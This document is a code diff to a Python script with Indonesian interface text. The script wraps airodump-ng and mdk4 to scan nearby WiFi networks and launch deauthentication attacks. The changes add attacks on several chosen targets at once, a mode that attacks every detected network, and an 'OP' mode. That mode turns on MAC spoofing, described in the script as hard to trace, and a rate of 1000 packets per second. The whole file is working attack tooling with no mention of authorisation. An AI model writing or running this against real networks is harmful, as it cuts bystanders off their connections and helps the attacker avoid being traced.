@@ -145,7 +145,9 @@ def start_monitor_mode(adapter):
 
 
 def scan_networks(adapter, duration=10):
+    clear_screen()
     glitch_print("SCANNING WIFI NETWORKS...")
+    
     temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
     prefix = os.path.join(temp_dir, "scan")
     proc = subprocess.Popen(
@@ -170,49 +172,14 @@ def scan_networks(adapter, duration=10):
     for csv_path in sorted(glob.glob(prefix + "-*.csv")):
         with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
             reader = csv.reader(handle)
-            header = None
             for row in reader:
-                if not row:
+                if len(row) < 14:
                     continue
-                if header is None:
-                    header = [col.strip().lower() for col in row]
-                    continue
-                if len(row) < 4:
-                    continue
-
                 bssid = row[0].strip()
-                if not bssid or bssid.lower() == "bssid":
+                channel = row[3].strip()
+                essid = row[13].strip()
+                if not bssid or bssid.lower() == "bssid" or not essid:
                     continue
-
-                # Pilih indeks channel dan essid berdasarkan header jika tersedia
-                channel = None
-                essid = None
-                if header:
-                    try:
-                        ch_idx = header.index('channel')
-                    except ValueError:
-                        try:
-                            ch_idx = header.index('ch')
-                        except ValueError:
-                            ch_idx = 3
-                    try:
-                        essid_idx = header.index('essid')
-                    except ValueError:
-                        essid_idx = len(row) - 1
-
-                    if ch_idx < len(row):
-                        channel = row[ch_idx].strip()
-                    if essid_idx < len(row):
-                        essid = row[essid_idx].strip()
-
-                if channel is None:
-                    channel = row[3].strip() if len(row) > 3 else ''
-                if essid is None:
-                    essid = row[13].strip() if len(row) > 13 else ''
-
-                if not essid:
-                    continue
-
                 key = (bssid, channel, essid)
                 if key in seen:
                     continue
@@ -233,7 +200,8 @@ def scan_networks(adapter, duration=10):
 
 
 def stop_monitor_mode(monitor_iface):
-    glitch_print("STOPPING MONITOR MODE...")
+    clear_screen()
+    
     candidates = [monitor_iface]
     if monitor_iface.endswith("mon"):
         candidates.append(monitor_iface[:-3])
@@ -241,18 +209,270 @@ def stop_monitor_mode(monitor_iface):
         candidates.append(f"{monitor_iface}mon")
 
     for name in candidates:
-        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
+        result = run_command(["sudo", "airmon-ng", "stop", name], None, show_output=False)
         if result is not None:
             break
 
-    run_command(["sudo", "systemctl", "restart", "NetworkManager"], "RESTART NETWORKMANAGER", show_output=False)
+    run_command(["sudo", "systemctl", "restart", "NetworkManager"], None, show_output=False)
+    clear_screen()
 
 
-def set_monitor_channel(monitor_iface, channel):
-    if not channel:
+def parse_target_selection(choice_str, total_targets):
+    """
+    Parsing input selection untuk multiple target
+    Mendukung format:
+    - "2" -> target nomor 2
+    - "2 3 5" -> target 2, 3, dan 5
+    - "2-5" -> target 2, 3, 4, 5
+    - "1,3,5-7" -> kombinasi semua format
+    """
+    if not choice_str.strip():
+        return []
+    
+    selected = set()
+    parts = re.split(r'[,\s]+', choice_str.strip())
+    
+    for part in parts:
+        if not part:
+            continue
+            
+        if '-' in part:
+            # Range selection (e.g., "2-5")
+            try:
+                start, end = part.split('-')
+                start_num = int(start.strip())
+                end_num = int(end.strip())
+                if start_num > end_num:
+                    start_num, end_num = end_num, start_num
+                for num in range(start_num, end_num + 1):
+                    if 1 <= num <= total_targets:
+                        selected.add(num)
+            except ValueError:
+                continue
+        else:
+            # Single selection
+            try:
+                num = int(part.strip())
+                if 1 <= num <= total_targets:
+                    selected.add(num)
+            except ValueError:
+                continue
+    
+    return sorted(selected)
+
+
+def select_targets(networks):
+    """Memilih multiple target WiFi dengan berbagai format input"""
+    if not networks:
+        print("Ga ada jaringan yang ketemu.")
+        return None
+
+    print(f"\n{BOLD}Pilih target WiFi (bisa pilih banyak):{RESET}")
+    print(f"{YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7  atau  kombinasi{RESET}")
+    print()
+    
+    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
+    print(header)
+    print("-" * len(header))
+    for idx, net in enumerate(networks, start=1):
+        essid = net["essid"][:20]
+        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
+
+    while True:
+        choice = input("\nNomor target (pisahkan dengan spasi/koma, contoh: 2 3 5): ").strip()
+        
+        if not choice:
+            print("Input tidak boleh kosong, coba lagi.")
+            continue
+        
+        selected_indices = parse_target_selection(choice, len(networks))
+        
+        if not selected_indices:
+            print("Input salah atau tidak ada target valid, coba lagi.")
+            continue
+        
+        selected_targets = [networks[idx - 1] for idx in selected_indices]
+        
+        print(f"\n{GREEN}✓ Terpilih {len(selected_targets)} target:{RESET}")
+        for target in selected_targets:
+            print(f"  - {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
+        
+        confirm = input(f"\n{YELLOW}Lanjutkan serangan ke semua target? (y/n): {RESET}").strip().lower()
+        if confirm in ['y', 'yes', '']:
+            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets selected")
+            return selected_targets
+        else:
+            print("Mengulang pemilihan target...\n")
+            continue
+
+
+def select_attack_mode():
+    print(f"\n{BOLD}Pilih mode serangan:{RESET}")
+    print(f"{GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
+    print(f"{GREEN}2.{RESET} Semua target (serang semua jaringan yang terdeteksi)")
+    print(f"{GREEN}3.{RESET} Mode OP (dengan MAC Spoofing + Packet Rate tinggi)")
+
+    while True:
+        choice = input("\nNomor mode [1-3]: ").strip()
+        if choice == "1":
+            return "target"
+        if choice == "2":
+            return "all"
+        if choice == "3":
+            return "op"
+        print("Input salah, pilih 1, 2, atau 3.")
+
+
+def run_deauth_mdk4(targets, monitor_iface, op_mode=False):
+    """
+    Menjalankan MDK4 untuk multiple target
+    - op_mode=True: Aktifkan MAC Spoofing (-f) dan Packet Rate tinggi (-s 1000)
+    """
+    if not targets:
+        print(f"{RED}Tidak ada target untuk diserang.{RESET}")
         return
+    
+    # Siapkan file target untuk MDK4
+    target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
+    try:
+        for target in targets:
+            # Format: BSSID,channel
+            target_file.write(f"{target['bssid']},{target['channel']}\n")
+        target_file.close()
+        
+        # Tampilkan target yang akan diserang
+        print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 ke {len(targets)} target...{RESET}")
+        print(f"{YELLOW}Target yang diserang:{RESET}")
+        for target in targets:
+            print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
+        
+        # Base command
+        mdk4_cmd = [
+            "sudo",
+            "mdk4",
+            monitor_iface,
+            "d",  # Deauth mode
+            "-B", target_file.name,  # Target list file
+        ]
+        
+        # Mode OP: Aktifkan semua fitur
+        if op_mode:
+            mdk4_cmd.extend([
+                "-c", "h",      # High speed channel hopping
+                "-f",           # MAC Spoofing - Sulit dilacak!
+                "-s", "1000"    # 1000 packets per second - Super agresif!
+            ])
+            print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
+            print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
+            print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+            print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
+        else:
+            mdk4_cmd.extend([
+                "-c", "h"       # High speed channel hopping saja
+            ])
+            print(f"\n{YELLOW}Mode Normal (tanpa spoofing){RESET}")
+        
+        print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
+        print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
+        print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}")
+        print(f"{YELLOW}MDK4 akan menyerang semua target secara simultan!{RESET}\n")
+        
+        # Jalankan MDK4
+        proc = subprocess.Popen(mdk4_cmd)
+        
+        try:
+            proc.wait()
+        except KeyboardInterrupt:
+            print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+            print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")
+            
+    finally:
+        # Bersihkan file temporary
+        try:
+            os.unlink(target_file.name)
+        except OSError:
+            pass
 
-    run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], None, show_output=False)
+
+def run_deauth_all_mdk4(monitor_iface, op_mode=False):
+    """
+    Menjalankan MDK4 untuk semua target (mode broadcast)
+    - op_mode=True: Aktifkan MAC Spoofing (-f) dan Packet Rate tinggi (-s 1000)
+    """
+    print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 ke SEMUA target...{RESET}")
+    print(f"{YELLOW}MDK4 akan menyerang semua jaringan yang terdeteksi!{RESET}")
+    
+    mdk4_cmd = [
+        "sudo",
+        "mdk4",
+        monitor_iface,
+        "d",  # Deauth mode
+    ]
+    
+    # Mode OP: Aktifkan semua fitur
+    if op_mode:
+        mdk4_cmd.extend([
+            "-c", "h",      # High speed channel hopping
+            "-f",           # MAC Spoofing
+            "-s", "1000"    # 1000 packets per second
+        ])
+        print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
+        print(f"{CYAN}✓ MAC Spoofing: AKTIF (sulit dilacak){RESET}")
+        print(f"{CYAN}✓ Packet Rate: 1000 packets/detik (super agresif){RESET}")
+        print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
+    else:
+        mdk4_cmd.extend([
+            "-c", "h"       # High speed channel hopping saja
+        ])
+        print(f"\n{YELLOW}Mode Normal (tanpa spoofing){RESET}")
+    
+    print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
+    print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
+    print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}\n")
+    
+    proc = subprocess.Popen(mdk4_cmd)
+    
+    try:
+        proc.wait()
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+        print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")
+
+
+def prompt_keyboard_interrupt_action():
+    print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
+    print(f"{GREEN}1.{RESET} Pilih target lagi")
+    print(f"{GREEN}2.{RESET} Kembali ke menu")
+    print(f"{GREEN}3.{RESET} Keluar")
+
+    while True:
+        choice = input("\nPilih opsi [1-3]: ").strip()
+        if choice == "1":
+            return "restart"
+        if choice == "2":
+            return "menu"
+        if choice == "3":
+            return "exit"
+        print("Input salah, pilih 1, 2, atau 3.")
+
+
+def back_to_menu():
+    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
+    if not os.path.exists(menu_path):
+        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
+    os.execvp(sys.executable, [sys.executable, menu_path])
 
 
 def select_interface():
@@ -276,86 +496,6 @@ def select_interface():
         print("Input salah, coba lagi.")
 
 
-def select_target(networks):
-    if not networks:
-        print("Ga ada jaringan yang ketemu.")
-        return None
-
-    print(f"\n{BOLD}Pilih target WiFi:{RESET}")
-    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
-    print(header)
-    print("-" * len(header))
-    for idx, net in enumerate(networks, start=1):
-        essid = net["essid"][:20]
-        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
-
-    while True:
-        choice = input("\nNomor target: ").strip()
-        if choice.isdigit() and 1 <= int(choice) <= len(networks):
-            selected = networks[int(choice) - 1]
-            glitch_print(f"TARGET LOCKED: {selected['essid']}")
-            return selected
-        print("Input salah, coba lagi.")
-
-
-def select_attack_mode():
-    print(f"\n{BOLD}Pilih mode serangan:{RESET}")
-    print(f"{GREEN}1.{RESET} Target spesifik")
-    print(f"{GREEN}2.{RESET} Semua target")
-
-    while True:
-        choice = input("\nNomor mode [1-2]: ").strip()
-        if choice == "1":
-            return "target"
-        if choice == "2":
-            return "all"
-        print("Input salah, pilih 1 atau 2.")
-
-
-def run_deauth_target(target, monitor_iface):
-    set_monitor_channel(monitor_iface, target.get("channel"))
-    mdk4_cmd = [
-        "sudo",
-        "mdk4",
-        monitor_iface,
-        "d",
-        "-B",
-        target["bssid"],
-        "-c",
-        target["channel"],
-    ]
-
-    print(f"\n{YELLOW}Menjalankan mdk4 deauth target...{RESET}")
-    print(f"{YELLOW}{' '.join(mdk4_cmd)}{RESET}")
-    try:
-        result = subprocess.run(mdk4_cmd)
-        if result.returncode != 0:
-            print(f"{RED}MDK4 deauth target gagal dengan kode keluar {result.returncode}.{RESET}")
-    except KeyboardInterrupt:
-        print(f"\n{YELLOW}Serangan dihentikan oleh pengguna.{RESET}")
-
-
-def run_deauth_all(monitor_iface):
-    mdk4_cmd = [
-        "sudo",
-        "mdk4",
-        monitor_iface,
-        "d",
-        "-c",
-        "h",
-    ]
-
-    print(f"\n{YELLOW}Menjalankan mdk4 deauth all target...{RESET}")
-    print(f"{YELLOW}{' '.join(mdk4_cmd)}{RESET}")
-
-    try:
-        result = subprocess.run(mdk4_cmd)
-        if result.returncode != 0:
-            print(f"{RED}MDK4 deauth all target gagal dengan kode keluar {result.returncode}.{RESET}")
-    except KeyboardInterrupt:
-        print(f"\n{YELLOW}Serangan dihentikan oleh pengguna.{RESET}")
-
-
 def main():
     adapter = None
     monitor_iface = None
@@ -366,29 +506,55 @@ def main():
                 adapter = select_interface()
                 monitor_iface = start_monitor_mode(adapter)
 
+            clear_screen()
+            
+            # Pilih mode serangan
             attack_mode = select_attack_mode()
-            target = None
-
-            if attack_mode == "target":
-                networks = scan_networks(monitor_iface)
-                target = select_target(networks)
-                if target is None:
+            
+            # Cek apakah mode OP dipilih
+            op_mode = (attack_mode == "op")
+            
+            if attack_mode in ["target", "op"]:
+                # Mode target spesifik dengan multiple selection
+                print(f"{CYAN}{BOLD}[?]{RESET} Mau scan WiFi berapa detik?")
+                scan_input = input(f"{YELLOW}>> detik (default 10): {RESET}").strip()
+                
+                if scan_input.isdigit() and int(scan_input) > 0:
+                    scan_duration = int(scan_input)
+                else:
+                    scan_duration = 10
+                
+                networks = scan_networks(monitor_iface, duration=scan_duration)
+                targets = select_targets(networks)
+                
+                if targets is None or not targets:
                     print("\nTidak ada target terpilih, kembali ke awal.")
                     continue
-                run_deauth_target(target, monitor_iface)
+                
+                # Jalankan serangan MDK4 untuk target yang dipilih
+                run_deauth_mdk4(targets, monitor_iface, op_mode=op_mode)
             else:
-                run_deauth_all(monitor_iface)
-
-            print("\nMembersihkan sesi...")
+                # Mode semua target
+                run_deauth_all_mdk4(monitor_iface, op_mode=op_mode)
+            
+            # Setelah serangan selesai, stop monitor mode
             stop_monitor_mode(monitor_iface)
             break
 
         except KeyboardInterrupt:
-            print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
-            if monitor_iface:
-                stop_monitor_mode(monitor_iface)
-            print("Keluar dari program.")
-            sys.exit(0)
+            action = prompt_keyboard_interrupt_action()
+            if action == "restart":
+                print("\nMengulang ke pemilihan target...")
+                continue
+            if action == "menu":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                back_to_menu()
+            if action == "exit":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                clear_screen()
+                sys.exit(0)
 
 
 if __name__ == "__main__":
